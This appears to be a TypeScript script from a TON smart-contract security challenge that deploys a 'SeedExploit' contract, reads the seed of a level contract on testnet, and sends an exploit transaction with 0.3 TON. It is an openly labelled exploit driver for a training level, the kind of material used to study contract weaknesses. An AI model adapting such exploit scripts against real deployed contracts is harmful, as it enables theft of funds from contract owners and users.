import { Address, toNano } from '@ton/core';
import { compile, NetworkProvider } from '@ton/blueprint';
import { Seed, SeedExploit } from '../wrappers/wrappers/Seed';

// yarn blueprint run 16.SeedExploit --testnet --mnemonic
export async function run(provider: NetworkProvider) {
    const level_addr = Address.parse('EQCPLyTcwUjj4bYw-qlaMHgcPgXOVJTugswN5tcqzzQyGFz_');
    const level = provider.open(Seed.createFromAddress(level_addr));

    const exploit_code = await compile('SeedExploit');
    const exploit = provider.open(SeedExploit.createFromConfig({}, exploit_code));

    const seed = await level.getSeed();

    await exploit.sendExploit(provider.sender(), toNano('0.3'), level_addr, seed);
}
